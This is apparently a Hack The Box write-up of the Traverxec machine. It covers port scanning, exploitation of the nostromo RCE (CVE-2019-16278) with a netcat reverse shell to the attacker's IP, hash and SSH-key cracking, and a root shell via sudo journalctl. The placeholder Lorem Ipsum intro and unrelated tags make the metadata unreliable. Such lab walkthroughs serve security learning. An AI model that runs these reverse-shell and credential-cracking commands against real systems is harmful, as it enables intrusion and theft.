---
layout: single
title: Traverxec - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-11-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-traverxec/traverxec_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-traverxec/traverxec_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n ai.htb
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
    | ssh-hostkey:
    |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
    |   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
    |_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
    80/tcp open  http    nostromo 1.9.6
    |_http-server-header: nostromo 1.9.6
    |_http-title: TRAVERXEC
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  nmap -Pn -sV -n -p- traverxec.htb
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
    80/tcp open  http    nostromo 1.9.6
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  nmap -Pn -sV -n -sU traverxec.htb
    PORT     STATE         SERVICE  VERSION
    5353/udp open|filtered zeroconf

2. Enum with Dirb and Nikto, also dirb -X .html for html-extension-files
    .. Server: nostromo 1.9.6


3. Googling nostromo 1.9.6 there is a known RCE vuln (CVE-2019-16278). Download the script and execute.
    root@p3:/opt/htb/machines/traverxec# ./cve-2019-16278.sh traverxec.htb 80 nc -e /bin/sh 10.10.14.10 4488

    root@p3:/opt/shells# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.165] 57834
      id
      uid=33(www-data) gid=33(www-data) groups=33(www-data)

4. Upgrade the shell
    python -c 'import pty;pty.spawn("/bin/bash")'
    ctrl + z
    stty raw -echo
    fg
    <ENTER>
    <ENTER>
    export TERM=xterm

    www-data@traverxec:/home$ cd david/
    www-data@traverxec:/home/david$ ls -al
    ls: cannot open directory '.': Permission denied

5. Looking for creds for David, start by looking at the webserver - /var/nostromo/conf/
    www-data@traverxec:/var/nostromo/conf$ ls -al
      total 20
      drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
      drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
      -rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
      -rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
      -rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
    www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
      david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

    The password looks like a md5crypt (hash-mode 500), according to hashcat examples page.

6. Crack the hash using hashcat.
    root@p3:/opt/htb/machines/traverxec# hashcat -a0 -m500 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
      Session..........: hashcat
      Status...........: Cracked
      Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
      Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
      Time.Started.....: Mon Nov 18 10:41:10 2019 (6 secs)
      Time.Estimated...: Mon Nov 18 10:41:16 2019 (0 secs)
      Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
      Guess.Queue......: 1/1 (100.00%)
      Speed.#1.........:  1778.3 kH/s (13.23ms) @ Accel:256 Loops:125 Thr:32 Vec:1
      Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
      Progress.........: 10911744/14344385 (76.07%)
      Rejected.........: 0/10911744 (0.00%)
      Restore.Point....: 10616832/14344385 (74.01%)
      Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
      Candidates.#1....: Sabo2008 -> LilHaiti1
      Hardware.Mon.#1..: Temp: 56c Util: 67% Core:1635MHz Mem:6000MHz Bus:16
    root@p3:/opt/htb/machines/traverxec# cat cracked.txt
      $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me

    NOTE: Creds david:Nowonly4me

7. The creds above doesn't seem to be usable anywhere, so looking further in the config-file we find that homedirs are set
   Browsing to http://traverxec.htb/~david/ gives us a landing page where we can't do anything. This landing page is located
   as specified within the nostromo configuration file - /home/david/public_www.

   Trying to browse it locally however gives us another result.

   root@p3:/opt/htb/machines/traverxec# nc -lvnp 4488

    www-data@traverxec:/usr/bin$ export TERM=xterm
    www-data@traverxec:/usr/bin$ ls -alR /home/david/public_www/
    /home/david/public_www/:
      total 16
      drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
      drwx--x--x 5 david david 4096 Oct 25 17:02 ..
      -rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
      drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area

    /home/david/public_www/protected-file-area:
      total 16
      drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
      drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
      -rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
      -rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
    www-data@traverxec:/usr/bin$

8. Extract the .tgz to /dev/shm and recover the private SSH-key
    www-data@traverxec:/dev/shm$ tar -xvzf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
      home/david/.ssh/
      home/david/.ssh/authorized_keys
      home/david/.ssh/id_rsa
      home/david/.ssh/id_rsa.pub

9. Copy id_rsa locally, change it to hash-format using sshng2john, and then crack it.
    root@p3:/usr/share/john# ./sshng2john.py /opt/htb/machines/traverxec/id_rsa > /opt/htb/machines/traverxec/id_rsa.hash
    root@p3:/opt/htb/machines/traverxec# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
      Using default input encoding: UTF-8
      Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
      Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
      Cost 2 (iteration count) is 1 for all loaded hashes
      Will run 12 OpenMP threads
      Note: This format may emit false positives, so it will keep trying even after
      finding a possible candidate.
      Press 'q' or Ctrl-C to abort, almost any other key for status
      hunter           (/opt/htb/machines/traverxec/id_rsa)
      1g 0:00:00:01 DONE (2019-11-18 15:45) 0.5291g/s 7588Kp/s 7588Kc/s 7588KC/s  0125457423 ..*7¡Vamos!
      Session completed

10. Login with cracked creds (david:hunter) and grab user.txt
    root@p3:/opt/htb/machines/traverxec# ssh david@traverxec.htb -i id_rsa
    Enter passphrase for key 'id_rsa':
    Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

    david@traverxec:~$ cat user.txt
      7db0****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating the homedir of david and we find a script for statistics and data collection, server-stats.sh.
   Looking through the code we can see that they execute a line as sudo
      /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat

2. The command journalctl is running as root, and it used with less - that is interactive.
   Running the command by ourselves gives us interaction, reading on gtfobins we can create a shell here by typing !/bin/sh

   david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
     -- Logs begin at Tue 2019-11-19 06:23:10 EST, end at Tue 2019-11-19 07:53:45 EST. --
     Nov 19 07:09:13 traverxec sudo[2226]: pam_unix(sudo:auth): conversation failed
     Nov 19 07:09:13 traverxec sudo[2226]: pam_unix(sudo:auth): auth could not identify password for [www-data]
     Nov 19 07:09:13 traverxec sudo[2226]: www-data : command not allowed ; TTY=pts/3 ; PWD=/var/nostromo ; USER=root ; COMMAND=list
     Nov 19 07:18:33 traverxec su[2387]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/3 ruser=www-data rhost=
     Nov 19 07:18:36 traverxec su[2387]: FAILED SU (to bin) www-data on pts/3
     !/bin/sh
   # id
     uid=0(root) gid=0(root) groups=0(root)
   # cat /root/root.txt
     9aa3****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Journalctl
  https://gtfobins.github.io/gtfobins/journalctl/
